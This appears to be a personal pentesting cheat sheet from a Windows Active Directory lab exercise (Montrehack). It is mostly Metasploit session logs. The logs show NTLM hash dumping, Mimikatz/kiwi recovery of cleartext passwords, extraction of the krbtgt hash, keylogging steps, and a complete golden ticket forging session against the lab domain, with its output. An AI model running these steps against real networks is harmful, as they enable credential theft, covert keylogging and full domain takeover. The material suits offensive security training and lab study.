= Pentest Windows

== Netbios lookup

    $ nmblookup l33thax0r
    192.168.1.103 l33thax0r<00>

== LLMNR lookup

    $ systemd-resolve -p llmnr llmnr_test
    llmnr_test: 192.168.1.103%dongle0

    -- Information acquired via protocol LLMNR/IPv4 in 582.0ms.
    -- Data is authenticated: no

== Montrehack notes

    meterpreter > background
    set exploit local
    set payload ...

meterpreter > hashdump

Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
CodeMonkey:1000:aad3b435b51404eeaad3b435b51404ee:8c3efc486704d2ee71eebe71af14d86c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
it_support:1001:aad3b435b51404eeaad3b435b51404ee:d7e233670b66858a436c353b205d4faa:::


load kiwi

creds_all

    Domain     User           Password LM Hash  NTLM Hash
    ------     ----           --------
    -------  ---------
    APPSERVER  Administrator  SuperDumbPassword1234                                                                                                              
    YOLOCORP   APPSERVER$     ;ie1R1$akIR`PRYy/gAf-#z%x_>rWbhi1?jx]jp<q*dw5R`3#``IVa]6E%]ocrAp`oA2oFFXJ]V0*zw,zgClUWI<Kj?uXo-##+ShyNRhPh I'iu]AK?C*W!           
    YOLOCORP   Administrator  MegaSecurePassword1337                                                                                                             

psexec

sessions -l

sessions -i <id>

getuid

lester (local exploit suggester),
https://community.rapid7.com/community/metasploit/blog/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more

meterpreter > run post/windows/gather/credentials/domain_hashdump 

    [+] krbtgt (Key Distribution Center Service Account)
    krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6D981B5F011897173B8798B768A50159
    Password Expires: r
    Last Password Change: 5:46:47 PM Tuesday, February 09, 2016
    Last Logon: 12:00:00 AM Monday, January 01, 1601
    Logon Count: 0
     - Account Disabled

     Hash History:
     krbtgt:502:59D0B36FFE13DCCD01313C4B61F7BF28:6D981B5F011897173B8798B768A50159

corpo_user:Yolocorp2016

== Keylog

* migrate into explorer.exe process
* start keyscan dumping
* kill keypass.exe :3

== ms14-068

    msf post(enum_logged_on_users) > run

    [*] Running against session 6

    Current Logged Users
    ====================

    SID                                            User
    ---                                            ----
    S-1-5-18                                       NT AUTHORITY\SYSTEM
    S-1-5-21-3307929019-2426675606-3645377723-500  YOLOCORP\Administrator

    [*] Results saved in: /home/olivier/.msf4/loot/20160215205714_default_192.168.8.1_host.users.activ_126411.txt


    [+] corpo_user ()
    corpo_user:1105:aad3b435b51404eeaad3b435b51404ee:4F47C5CCDD37B4194A9EF1AC13484AD7
    Password Expires: r
    Last Password Change: 3:30:45 PM Wednesday, February 10, 2016
    Last Logon: 5:34:59 PM Monday, February 15, 2016
    Logon Count: 6
     - Password Never Expires

     Hash History:
     corpo_user:1105:ADAEC08AA44D3B71BF679D17BF3DAB34:4F47C5CCDD37B4194A9EF1AC13484AD7



== Golden ticket creation

----
msf exploit(psexec) > use post/windows/escalate/golden_ticket
msf post(golden_ticket) > show options

Module options (post/windows/escalate/golden_ticket):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   DOMAIN                        no        Target Domain
   Domain SID                    no        Domain SID
   GROUPS                        no        ID of Groups (Comma Seperated)
   ID                            no        Target User ID
   KRBTGT_HASH                   no        KRBTGT NTLM Hash
   SESSION                       yes       The session to run this module on.
   USE          false            yes       Use the ticket in the current session
   USER                          no        Target User

msf post(golden_ticket) > set session 6
session => 6
msf post(golden_ticket) > set user Administrator
user => Administrator
msf post(golden_ticket) > set domain YOLOCORP
domain => YOLOCORP
msf post(golden_ticket) > set krbtgt_hash 6D981B5F011897173B8798B768A50159
krbtgt_hash => 6D981B5F011897173B8798B768A50159
msf post(golden_ticket) > exploit

[*] Obtaining YOLOCORP SID...
[+] Found YOLOCORP SID: S-1-5-21-3307929019-2426675606-3645377723
[*] Creating Golden Ticket for YOLOCORP\Administrator...
[+] Golden Ticket Obtained!
[*] Ticket saved to /home/olivier/.msf4/loot/20160215202156_default_192.168.8.1_golden.ticket_237379.bin
[*] Post module execution completed
msf post(golden_ticket) > 
----


